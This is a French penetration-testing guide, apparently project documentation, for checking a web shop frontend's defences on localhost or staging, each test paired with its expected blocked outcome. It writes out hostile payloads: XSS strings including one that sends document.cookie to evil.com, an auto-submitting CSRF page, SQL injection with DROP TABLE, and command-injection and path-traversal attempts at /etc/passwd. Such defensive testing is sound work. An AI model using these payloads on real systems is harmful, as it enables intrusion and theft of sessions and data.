# Guide de Tests de Pénétration

Guide pratique pour effectuer des tests de pénétration basiques sur l'application frontend.

⚠️ **ATTENTION**: Ces tests ne doivent être effectués QUE sur vos propres environnements (dev/staging).

## Préparation

### Outils Nécessaires

```bash
# Navigateur avec DevTools (Chrome/Firefox)
# Burp Suite Community (optionnel)
# curl
# Node.js + pnpm
```

### Environnement de Test

**✅ Autorisé:**
- http://localhost:3001 (dev local)
- Environnement de staging dédié

**❌ Interdit:**
- Production (https://chanvre-vert.fr)
- Environnements clients

## Tests XSS (Cross-Site Scripting)

### Test 1: XSS Reflected

**Objectif:** Tenter d'injecter du JavaScript via les paramètres URL

**Procédure:**
```bash
# Tester injection dans query params
http://localhost:3001/search?q=<script>alert('XSS')</script>
http://localhost:3001/products?name=<img src=x onerror=alert(1)>
```

**Résultat attendu:**
- ✅ Le script ne doit PAS s'exécuter
- ✅ Le contenu doit être échappé ou sanitisé
- ✅ Devrait apparaître comme texte brut: `<script>alert('XSS')</script>`

### Test 2: XSS Stored (via RichTextRenderer)

**Objectif:** Tenter d'injecter du JavaScript dans le contenu HTML

**Procédure:**
1. En tant qu'admin, créer un produit
2. Injecter dans la description:
```html
<script>alert('XSS Stored')</script>
<p>Description normale</p>
<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">
```

3. Afficher le produit côté client

**Résultat attendu:**
- ✅ Le `<script>` doit être supprimé par DOMPurify
- ✅ L'`onerror` doit être supprimé
- ✅ Seul `<p>Description normale</p>` doit s'afficher
- ✅ DevTools Console: Aucune erreur ni requête vers evil.com

### Test 3: XSS via Attributs HTML

**Procédure:**
Tenter d'injecter dans divers champs:
```html
" onload="alert(1)
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

**Résultat attendu:**
- ✅ Tous les event handlers doivent être strippés
- ✅ Les URLs `javascript:` doivent être bloquées

### Test 4: DOM-based XSS

**Procédure:**
```javascript
// Dans la console DevTools
document.location = 'http://localhost:3001/#<script>alert(1)</script>'
```

**Résultat attendu:**
- ✅ Le script ne doit pas s'exécuter même si présent dans le fragment URL

## Tests CSRF (Cross-Site Request Forgery)

### Test 1: CSRF Simple

**Procédure:**
1. Créer une page HTML malveillante `attack.html`:
```html
<!DOCTYPE html>
<html>
<head><title>CSRF Attack</title></head>
<body>
  <h1>Cliquez pour gagner un iPhone!</h1>
  <form id="csrf" action="http://localhost:3001/api/checkout" method="POST">
    <input type="hidden" name="amount" value="999999">
    <button>Cliquer ici</button>
  </form>
  <script>
    // Auto-submit
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

2. Ouvrir `attack.html` dans le navigateur
3. Être connecté sur localhost:3001

**Résultat attendu:**
- ✅ La requête doit être bloquée (vérification Origin)
- ✅ Code 403 Forbidden
- ✅ Console: Erreur CORS ou Origin invalide

### Test 2: CSRF avec Fetch

**Procédure:**
Dans la console DevTools (sur une autre origine):
```javascript
fetch('http://localhost:3001/api/auth/logout', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' }
})
.then(r => console.log('Success:', r))
.catch(e => console.log('Blocked:', e));
```

**Résultat attendu:**
- ✅ Erreur CORS: "No 'Access-Control-Allow-Origin' header"
- ✅ Ou 403 Forbidden (Origin check)

### Test 3: CSRF Token Missing

**Procédure:**
Avec Burp Suite ou curl:
```bash
curl -X POST http://localhost:3001/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"amount": 100}' \
  -v
```

**Résultat attendu:**
- ✅ 401 Unauthorized (pas de cookie payload-token)
- ✅ Ou 403 Forbidden (pas de token CSRF)

## Tests d'Authentification

### Test 1: Accès sans Authentification

**Procédure:**
1. Se déconnecter complètement
2. Tenter d'accéder:
```bash
curl http://localhost:3001/api/auth/me
curl http://localhost:3001/api/customers/addresses
curl http://localhost:3001/api/checkout
```

**Résultat attendu:**
- ✅ 401 Unauthorized
- ✅ Message: `{"error":"Unauthorized"}`

### Test 2: Token JWT en localStorage (doit être absent)

**Procédure:**
Dans DevTools Console:
```javascript
// Vérifier localStorage
console.log(localStorage);
Object.keys(localStorage).forEach(key => {
  const value = localStorage.getItem(key);
  console.log(key, value);
  
  // Tester si c'est un JWT (format: xxx.yyy.zzz)
  if (/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/.test(value)) {
    console.error('⚠️ JWT trouvé en localStorage:', key);
  }
});
```

**Résultat attendu:**
- ✅ Aucun JWT trouvé
- ✅ Pas de clé `auth_bearer`, `token`, etc.

### Test 3: Cookie HttpOnly

**Procédure:**
Dans DevTools Console:
```javascript
// Tenter de lire le cookie d'auth
document.cookie.split('; ').forEach(c => console.log(c));

// Le cookie payload-token ne doit PAS apparaître (HttpOnly)
const hasAuthCookie = document.cookie.includes('payload-token');
console.log('Cookie auth accessible en JS?', hasAuthCookie);
```

**Résultat attendu:**
- ✅ `hasAuthCookie === false`
- ✅ Le cookie payload-token est HttpOnly (invisible en JS)

## Tests d'Injection

### Test 1: SQL Injection (via API)

**Procédure:**
```bash
# Tester dans les paramètres
curl "http://localhost:3001/api/products?id=1' OR '1'='1"
curl "http://localhost:3001/api/search?q='; DROP TABLE products;--"
```

**Résultat attendu:**
- ✅ Pas d'erreur SQL exposée
- ✅ Requête traitée comme une chaîne normale
- ✅ Backend utilise des requêtes paramétrées (PayloadCMS)

### Test 2: Command Injection

**Procédure:**
```bash
curl -X POST http://localhost:3001/api/contact \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com; cat /etc/passwd"}'
```

**Résultat attendu:**
- ✅ Pas d'exécution de commande
- ✅ Email validé et rejeté si invalide

### Test 3: Path Traversal

**Procédure:**
```bash
curl "http://localhost:3001/api/files/../../../../etc/passwd"
curl "http://localhost:3001/images/..%2F..%2F..%2Fetc%2Fpasswd"
```

**Résultat attendu:**
- ✅ 404 Not Found
- ✅ Ou erreur de validation
- ✅ Pas d'accès aux fichiers système

## Tests de Configuration

### Test 1: Headers de Sécurité

**Procédure:**
```bash
curl -I http://localhost:3001
```

**Résultat attendu:**
```
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self'...
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=()...
```

✅ Tous ces headers doivent être présents
❌ `X-Powered-By` ne doit PAS être présent

### Test 2: Source Maps en Production

**Procédure:**
```bash
# Tester si les source maps sont accessibles
curl -I https://chanvre-vert.fr/_next/static/chunks/main.js.map
```

**Résultat attendu:**
- ✅ 404 Not Found (source maps désactivées en prod)

### Test 3: Informations sensibles dans le HTML

**Procédure:**
```bash
curl http://localhost:3001 | grep -i "password\|secret\|api.key\|token"
```

**Résultat attendu:**
- ✅ Aucune information sensible dans le HTML source

## Tests de Session

### Test 1: Session Fixation

**Procédure:**
1. Récupérer un cookie de session (avant connexion)
2. Se connecter
3. Vérifier si le cookie a changé

**Résultat attendu:**
- ✅ Le cookie `payload-token` doit être différent après connexion
- ✅ Nouvelle session générée à chaque login

### Test 2: Session Timeout

**Procédure:**
1. Se connecter
2. Attendre l'expiration (7 jours par défaut)
3. Tenter une requête auth

**Résultat attendu:**
- ✅ 401 Unauthorized après expiration
- ✅ Redirection vers /connexion

## Tests Automatisés avec OWASP ZAP

### Installation
```bash
# Via Docker
docker pull zaproxy/zap-stable
```

### Scan Basique
```bash
docker run -t zaproxy/zap-stable zap-baseline.py \
  -t http://localhost:3001 \
  -r zap-report.html
```

### Scan Complet (Spider + Active Scan)
```bash
docker run -t zaproxy/zap-stable zap-full-scan.py \
  -t http://localhost:3001 \
  -r zap-full-report.html
```

**Résultat attendu:**
- Risque Élevé: 0
- Risque Moyen: ≤ 5 (à analyser)
- Risque Faible: Acceptable

## Rapport de Test

### Template de Rapport

```markdown
# Rapport de Test de Pénétration

**Date:** YYYY-MM-DD
**Testeur:** [Nom]
**Environnement:** [Dev/Staging]
**Durée:** [X heures]

## Résumé

- Tests effectués: X
- Vulnérabilités trouvées: Y
- Risque critique: Z

## Détails

### XSS
- [ ] Reflected XSS: ✅ Bloqué
- [ ] Stored XSS: ✅ DOMPurify actif
- [ ] DOM XSS: ✅ Protégé

### CSRF
- [ ] CSRF Token: ✅ Implémenté
- [ ] Origin Check: ✅ Actif
- [ ] SameSite Cookie: ✅ lax

### Auth
- [ ] JWT en localStorage: ✅ Absent
- [ ] Cookie HttpOnly: ✅ Actif
- [ ] Session Management: ✅ Sécurisé

### Configuration
- [ ] Security Headers: ✅ Présents
- [ ] Source Maps: ✅ Désactivées en prod
- [ ] Secrets exposés: ✅ Aucun

## Recommandations

1. [Si applicable]
2. [Si applicable]

## Conclusion

[✅ Système sécurisé / ⚠️ Améliorations nécessaires / ❌ Vulnérabilités critiques]
```

## Ressources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackerOne Hacker101](https://www.hacker101.com/)
- [OWASP ZAP](https://www.zaproxy.org/)

## Support

Pour questions sur les tests de pénétration:
- Consulter `frontend/docs/SECURITY-AUDIT-IMPLEMENTATION.md`
- Consulter `frontend/docs/CSRF-SECURITY.md`

